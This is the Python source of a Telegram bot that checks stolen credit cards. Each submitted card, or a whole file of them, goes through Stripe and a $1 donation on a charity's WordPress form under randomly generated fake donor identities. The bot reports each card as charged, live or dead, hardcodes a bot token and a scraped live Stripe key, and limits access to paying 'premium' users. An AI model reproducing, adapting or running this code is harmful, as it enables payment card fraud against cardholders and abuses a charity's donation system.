import telebot
import requests
import random
import string
import time
import os

token = "7671490652:AAFUvybgUcm8LIf3giv9v-XQCtMrWfySAv0"
bot = telebot.TeleBot(token)
admin_id = 6957690997  # Owner's user ID
premium_file = "premium.txt"

# Create premium file if it doesn't exist
if not os.path.exists(premium_file):
    with open(premium_file, 'w') as f:
        pass

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def charge(cc):
    user_agent = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    
    ccx = cc.strip().split("|")
    if len(ccx) != 4:
        return f"Invalid CC format: {cc}"

    num, mm, yy, cvc = ccx
    card = f"{num}|{mm}|{yy}|{cvc}"
    start_time = time.time()
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent,
    }

    data = f'type=card&billing_details[name]=Bhh&billing_details[email]={acc}&card[number]={num}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F276ab76cdc%3B+stripe-js-v3%2F276ab76cdc%3B+card-element&referrer=https%3A%2F%2Fsmofi.org&time_on_page=78927&key=pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = response.json().get('id')
    
    if not id:
        return f"Failed to check, retry! {card}."

    headers = {
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': user_agent,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Referer': 'https://smofi.org/donations/',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'charitable_form_id': '6757ce6e13730',
        '6757ce6e13730': '',
        '_charitable_donation_nonce': 'a9bf5685a5',
        '_wp_http_referer': '/donations/',
        'campaign_id': '2600',
        'description': 'Donations to SMOFI',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'first_name': username,
        'last_name': 'ksiis',
        'phone_number': '2195989787',
        'email': acc,
        'donor_comment': '',
        'gateway': 'stripe',
        'stripe_payment_method': id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }

    response = requests.post('https://smofi.org/wp-admin/admin-ajax.php', headers=headers, data=data)
    resp = response.json()
    success = resp.get("success")
    end_time = time.time()
    timetaken = start_time - end_time
    if success:
        secret = resp.get("secret", "Not Found")
        parts = secret.split("_secret", 1)
        part1 = parts[0]
        part2 = "secret" + parts[1]
        msg = f"CC -> {card}\n- RESULT -> CHARGE 🔥- Payment Successful!\n- TIME TAKEN -> {timetaken:.2f}s\n\n{part1} - {part2}"
        return msg
    else:
        errors = resp.get("errors", "Unknown error")
        emsg = ', '.join(errors) if isinstance(errors, list) else str(errors)
        if 'incorrect cvc' in emsg:
            msg = f"CARD -> {card}\nRESULT -> LIVE ✅ - {emsg}\nTIME TAKEN -> {timetaken:.2f}s\n"
        else:
            msg = f"CARD -> {card}\nRESULT -> DEAD ❎ - {emsg}\nTIME TAKEN -> {timetaken:.2f}s\n"
        return msg

def process_file(file_path, chat_id):
    try:
        with open(file_path, 'r') as file:
            ccs = file.readlines()

        for cc in ccs:
            result = charge(cc)
            bot.send_message(chat_id, result)
    except FileNotFoundError:
        bot.send_message(chat_id, f"The file '{file_path}' was not found.")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    with open(premium_file, 'r') as file:
        premium_users = file.readlines()

    if str(message.chat.id) == str(admin_id):
        bot.reply_to(message, "Welcome, Owner! ")
    elif str(message.chat.id) in [user.strip() for user in premium_users]:
        bot.reply_to(message, "Welcome, authorized user!")
    else:
        bot.reply_to(message, "For access, visit @Titan_kumar")

@bot.message_handler(commands=['stop'])
def stop_processing(message):
    bot.reply_to(message, "Processing stopped.")

@bot.message_handler(commands=['add'])
def add_premium_user(message):
    if message.chat.id == admin_id:
        try:
            user_id = message.text.split()[1]
            with open(premium_file, 'a') as file:
                file.write(f"{user_id}\n")
            bot.reply_to(message, f"User {user_id} added to premium list.")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID.")
    else:
        bot.reply_to(message, "Unauthorized access!")

@bot.message_handler(content_types=['text'])
def handle_text_message(message):
    if message.chat.type == "private":
        try:
            with open(premium_file, 'r') as file:
                premium_users = file.readlines()
            
            if str(message.chat.id) not in [user.strip() for user in premium_users] and str(message.chat.id) != str(admin_id):
                bot.reply_to(message, "You are unauthorized to use this bot.")
                return

            result = charge(message.text)
            process = bot.reply_to(message, "Processing Hold ON...")
            bot.edit_message_text(result, message.chat.id, process.id)
        except Exception as e:
            bot.reply_to(message, f"An error occurred: {str(e)}")
    else:
        pass

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.chat.type == "private":
        try:
            with open(premium_file, 'r') as file:
                premium_users = file.readlines()
            
            if str(message.chat.id) not in [user.strip() for user in premium_users] and str(message.chat.id) != str(admin_id):
                bot.reply_to(message, "You are unauthorized to use this bot.")
                return

            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_path = f"{message.document.file_name}"
            with open(file_path, 'wb') as file:
                file.write(downloaded_file)
            bot.reply_to(message, "File Received! Processing Hold ON!")
            process_file(file_path, message.chat.id)
        except Exception as e:
            bot.reply_to(message, f"An error occurred while processing the file: {str(e)}")
    else:
        pass

if __name__ == "__main__":
    print("Bot is running...")
    bot.polling()